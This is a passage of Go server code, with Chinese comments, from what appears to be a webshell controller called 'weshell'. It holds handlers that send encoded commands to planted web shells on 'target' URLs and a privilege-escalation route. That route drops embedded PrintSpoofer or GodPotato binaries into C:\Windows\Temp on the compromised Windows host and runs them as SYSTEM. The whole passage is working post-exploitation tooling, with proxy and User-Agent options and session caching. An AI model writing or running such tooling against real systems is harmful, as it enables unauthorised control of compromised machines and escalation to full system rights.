	os, _ := info["os"].(string)
	return os
}

func (s *Server) auditFS(id, op, path string, ok bool) {
	s.store.TouchLastUsed(id)
	s.store.AppendRecord(store.CommandRecord{
		TargetID: id,
		Command:  "fs:" + op + " " + path,
		OK:       ok,
	})
}

// execCommand 对靶标执行一次命令，记录审计日志，并把结果返回给前端。
func (s *Server) execCommand(w http.ResponseWriter, r *http.Request, id string) {
	t, ok := s.store.Get(id)
	if !ok {
		writeJSON(w, http.StatusNotFound, newError("靶标不存在"))
		return
	}
	var in execInput
	if !decodeJSON(w, r, &in) {
		return
	}

	// 审计日志先行落地：即便靶机无响应，也能留下「谁执行了什么」的痕迹。
	s.logger.Infof("执行命令 target=%s<%s> command=%q", t.Name, t.URL, truncate(in.Command, 300))

	res := shell.Execute(r.Context(), s.execOpts(t).WithCommand(in.Command))

	// 失败时单独打一行，避免「HTTP 200 + body 里 ok:false」把问题藏起来，
	// 否则只看访问日志会误以为一切正常。
	if !res.OK {
		s.logger.Infof("命令执行失败 target=%s<%s> command=%q error=%q latency=%dms",
			t.Name, t.URL, truncate(in.Command, 300), firstLine(res.Error), res.LatencyMS)
	}

	s.store.TouchLastUsed(id)
	s.store.AppendRecord(store.CommandRecord{
		TargetID:  id,
		Command:   in.Command,
		OK:        res.OK,
		LatencyMS: res.LatencyMS,
		Message:   firstLine(res.Error),
	})
	writeJSON(w, http.StatusOK, res)
}

// handlePrivEsc 处理 /api/targets/{id}/privesc：把服务端内嵌的提权工具自动部署到靶机并以
// SYSTEM 身份执行，返回命令回显。仅支持结构化类型靶机（自动部署走文件写入通道）。
//
// 请求体：{ tool, path, mode, command, pid }。tool ∈ printspoofer|godpotato-go
// （godpotato-cpp 仍保留兼容）；path 缺省由 tool 决定；
// mode ∈ command|list|interactive（PrintSpoofer 专用，GodPotato 只支持 command；
// pid 对应 PrintSpoofer 的 -p）。
func (s *Server) handlePrivEsc(w http.ResponseWriter, r *http.Request, id string) {
	if r.Method != http.MethodPost {
		writeJSON(w, http.StatusMethodNotAllowed, newError("只支持 POST"))
		return
	}
	t, ok := s.store.Get(id)
	if !ok {
		writeJSON(w, http.StatusNotFound, newError("靶标不存在"))
		return
	}
	var in struct {
		Tool    string `json:"tool"` // 提权工具：printspoofer | godpotato-go | godpotato-cpp
		Path    string `json:"path"`
		Mode    string `json:"mode"`
		Command string `json:"command"`
		PID     string `json:"pid"`
		// DeployOnly 为真时只部署并校验，不执行提权（前端「部署自检」按钮用），
		// 返回逐步报告，便于在不跑提权的前提下定位上传/组装/校验环节的问题。
		DeployOnly bool `json:"deployOnly"`
	}
	if !decodeJSON(w, r, &in) {
		return
	}
	tool := strings.ToLower(strings.TrimSpace(in.Tool))
	exe, defPath, terr := s.privescTool(tool)
	if terr != nil {
		writeJSON(w, http.StatusBadRequest, newError(terr.Error()))
		return
	}
	path := strings.TrimSpace(in.Path)
	if path == "" {
		path = defPath
	}
	mode := strings.TrimSpace(in.Mode)
	if mode == "" {
		mode = "command"
	}
	o := s.execOpts(t)

	// 仅部署自检：不执行提权，把每一步的命令与回显原样返回给前端展示。
	if in.DeployOnly {
		rep, err := shell.DeployOnly(r.Context(), o, shell.PrivEscOptions{
			EXE:  exe,
			Path: path,
		})
		if err != nil {
			rep.Steps = append(rep.Steps, shell.DeployStep{Name: "失败", Cmd: "", Output: err.Error(), OK: false})
			writeJSON(w, http.StatusOK, rep)
			return
		}
		s.store.TouchLastUsed(id)
		writeJSON(w, http.StatusOK, rep)
		return
	}

	res, err := shell.PrivEsc(r.Context(), o, shell.PrivEscOptions{
		EXE:     exe,
		Tool:    tool,
		Path:    path,
		Mode:    mode,
		Command: in.Command,
		PID:     strings.TrimSpace(in.PID),
	})
	if err != nil {
		writeJSON(w, http.StatusBadRequest, newError(err.Error()))
		return
	}
	s.logger.Infof("提权执行 target=%s<%s> tool=%s mode=%s path=%s deployed=%s", t.Name, t.URL, tool, mode, path, res.DeployedPath)
	s.store.TouchLastUsed(id)
	s.store.AppendRecord(store.CommandRecord{
		TargetID:  id,
		Command:   "privesc:" + tool + " " + mode + " " + path,
		OK:        res.OK,
		LatencyMS: res.LatencyMS,
		Message:   firstLine(res.Error),
	})
	writeJSON(w, http.StatusOK, res)
}

// privescTool 按工具名返回对应的内嵌二进制与默认落盘路径。
// 留空按 printspoofer 处理（兼容旧前端）。
func (s *Server) privescTool(name string) (exe []byte, defPath string, err error) {
	switch strings.ToLower(strings.TrimSpace(name)) {
	case "", "printspoofer":
		if len(s.cfg.PrintSpooferEXE) == 0 {
			return nil, "", errors.New("PrintSpoofer.exe 未内嵌：请确认构建 weshell 前 tools/printspoofer/PrintSpoofer.exe 已存在")
		}
		return s.cfg.PrintSpooferEXE, `C:\Windows\Temp\PrintSpoofer.exe`, nil
	case "godpotato-cpp":
		if len(s.cfg.GodPotatoCppEXE) == 0 {
			return nil, "", errors.New("GodPotato(C++) 未内嵌：请先运行 tools/godpotato_cpp/build.bat 生成 godpotato_cpp.exe 再构建 weshell")
		}
		return s.cfg.GodPotatoCppEXE, `C:\Windows\Temp\godpotato_cpp.exe`, nil
	case "godpotato-go":
		if len(s.cfg.GodPotatoGoEXE) == 0 {
			return nil, "", errors.New("GodPotato(Go) 未内嵌：请先在 tools/godpotato 下 go build -o godpotato.exe . 再构建 weshell")
		}
		return s.cfg.GodPotatoGoEXE, `C:\Windows\Temp\godpotato.exe`, nil
	}
	return nil, "", fmt.Errorf("未知提权工具: %q", name)
}

func (s *Server) handleHistory(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		writeJSON(w, http.StatusMethodNotAllowed, newError("只支持 GET"))
		return
	}
	limit := 200
	if raw := r.URL.Query().Get("limit"); raw != "" {
		if n, err := strconv.Atoi(raw); err == nil && n > 0 && n <= 500 {
			limit = n
		}
	}
	writeJSON(w, http.StatusOK, s.store.History(limit))
}

// ---------- 入参与响应 ----------

// targetInput 是靶标的新增/更新入参。
type targetInput struct {
	Name        string `json:"name"`
	URL         string `json:"url"`
	ShellType   string `json:"shellType"`
	Param       string `json:"param"`
	Method      string `json:"method"`
	Proxy       string `json:"proxy"`
	Note        string `json:"note"`
	Encoding    string `json:"encoding"`
	EncodingKey string `json:"encodingKey"`
}

// normalize 校验并规范化入参。
func (in targetInput) normalize() (store.Target, error) {
	name := strings.TrimSpace(in.Name)
	if name == "" {
		return store.Target{}, errors.New("靶标名称不能为空")
	}
	rawURL := strings.TrimSpace(in.URL)
	u, err := url.Parse(rawURL)
	if err != nil {
		return store.Target{}, fmt.Errorf("URL 无法解析: %v", err)
	}
	if u.Scheme != "http" && u.Scheme != "https" {
		return store.Target{}, errors.New("URL 必须以 http:// 或 https:// 开头")
	}
	if u.Host == "" {
		return store.Target{}, errors.New("URL 缺少主机名")
	}
	param := strings.TrimSpace(in.Param)
	if param == "" {
		return store.Target{}, errors.New("连接参数名不能为空")
	}
	method := strings.ToUpper(strings.TrimSpace(in.Method))
	if method == "" {
		method = http.MethodPost
	}
	if method != http.MethodGet && method != http.MethodPost {
		return store.Target{}, errors.New("请求方法只能是 GET 或 POST")
	}
	if !shell.Valid(in.ShellType) {
		return store.Target{}, fmt.Errorf("未知的连接类型: %q", in.ShellType)
	}
	enc := strings.ToLower(strings.TrimSpace(in.Encoding))
	if enc == "none" {
		enc = ""
	}
	if enc != "" && enc != "base64" && enc != "hex" && enc != "xor" {
		return store.Target{}, fmt.Errorf("不支持的编码方式: %q", in.Encoding)
	}
	key := strings.TrimSpace(in.EncodingKey)
	if enc == "xor" && key == "" {
		return store.Target{}, errors.New("xor 编码需要提供密钥(encodingKey)")
	}
	proxy := strings.TrimSpace(in.Proxy)
	if proxy != "" {
		if _, err := shell.ProxyURL(proxy); err != nil {
			return store.Target{}, err
		}
	}
	return store.Target{
		Name:        name,
		URL:         rawURL,
		ShellType:   in.ShellType,
		Param:       param,
		Method:      method,
		Proxy:       proxy,
		Note:        strings.TrimSpace(in.Note),
		Encoding:    enc,
		EncodingKey: key,
	}, nil
}

// execOpts 由靶标信息与全局设置构造一次执行的 ExecOptions：自动带上该靶机的代理，
// 以及全局设置里的 User-Agent（默认 / 固定 / 随机）。
func (s *Server) execOpts(t store.Target) shell.ExecOptions {
	return shell.ExecOptions{
		TargetURL:   t.URL,
		Param:       t.Param,
		Method:      t.Method,
		Type:        t.ShellType,
		Timeout:     s.cfg.Timeout,
		Proxy:       t.Proxy,
		UserAgent:   s.store.GetSettings().UserAgent,
		Encoding:    t.Encoding,
		EncodingKey: t.EncodingKey,
		Jar:         s.jarFor(t.ID),
	}
}

// laxPublicSuffixList 是一个宽松的公共后缀列表实现：对任意主机都返回空后缀，
// 从而允许 net/http/cookiejar 为 localhost / 127.0.0.1 / 纯 IP 这类"无公共后缀"的
// 主机设置 cookie（默认列表会拒绝，导致会话无法保持）。
type laxPublicSuffixList struct{}

func (laxPublicSuffixList) PublicSuffix(string) string { return "" }
func (laxPublicSuffixList) String() string            { return "lax" }

// jarFor 返回（或懒建）某靶机专用的 cookie 罐。会话模块机制靠它跨请求维持
// 靶机的 ASPSESSIONID / PHPSESSID，使靶机会话（含已缓存的模块源码）在多次调用间保持。
// 按靶机 ID 隔离，避免同一主机上不同靶机的会话 cookie 相互串扰。
//
// 注意：必须用宽松的公共后缀列表，否则默认列表会拒绝为 localhost / 127.0.0.1 / 纯 IP
// 这类"无公共后缀"的主机设置 cookie，导致会话无法保持、模块每次都重存（优化失效）。
func (s *Server) jarFor(id string) http.CookieJar {
	if v, ok := s.jars.Load(id); ok {
		return v.(http.CookieJar)
	}
	j, err := cookiejar.New(&cookiejar.Options{PublicSuffixList: laxPublicSuffixList{}})
	if err != nil {
		// 退化方案：无 cookie 罐时回退默认（localhost/IP 下可能不缓存，但功能仍正常）。
		j, _ = cookiejar.New(nil)
	}
	actual, _ := s.jars.LoadOrStore(id, j)
	return actual.(http.CookieJar)
}

// handleClearModules 处理 DELETE /api/targets/modules/{id}：清空靶机会话中缓存的模块源码。
func (s *Server) handleClearModules(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodDelete {
		writeJSON(w, http.StatusMethodNotAllowed, newError("只支持 DELETE"))
		return
	}
	id := strings.Trim(strings.TrimPrefix(r.URL.Path, "/api/targets/modules/"), "/")
	if id == "" || strings.ContainsAny(id, "/\\") {
		writeJSON(w, http.StatusBadRequest, newError("缺少靶机 ID"))
		return
	}
	t, ok := s.store.Get(id)
	if !ok {
		writeJSON(w, http.StatusNotFound, newError("靶标不存在"))
		return
	}
	opts := s.execOpts(t)
	if err := shell.ClearModules(r.Context(), opts, shell.ForType(opts.Type)); err != nil {
		writeJSON(w, http.StatusInternalServerError, newError(err.Error()))
		return
	}
	s.jars.Delete(id) // 本地 cookie 罐也一并丢弃
	writeJSON(w, http.StatusOK, map[string]any{"ok": true})
}

// apiError 是统一的错误响应体。
type apiError struct {
	Error string `json:"error"`
	Time  string `json:"time"`
}

func newError(msg string) apiError {
	return apiError{Error: msg, Time: time.Now().Format(time.RFC3339)}
}

func decodeJSON(w http.ResponseWriter, r *http.Request, dst any) bool {
	if err := json.NewDecoder(r.Body).Decode(dst); err != nil {
		writeJSON(w, http.StatusBadRequest, newError("请求体 JSON 解析失败: "+err.Error()))
		return false
	}
	return true
}

func writeJSON(w http.ResponseWriter, status int, payload any) {
	w.Header().Set("Content-Type", "application/json; charset=utf-8")
	w.Header().Set("Cache-Control", "no-store")
	w.WriteHeader(status)
	if err := json.NewEncoder(w).Encode(payload); err != nil {
		logrus.Infof("写出 JSON 响应失败: %v", err)
	}
}

func firstLine(s string) string {
	if i := strings.IndexByte(s, '\n'); i >= 0 {
		return s[:i]
	}
	return s
}

func truncate(s string, n int) string {
	runes := []rune(s)
	if len(runes) <= n {
		return s
	}
	return string(runes[:n]) + "..."
}
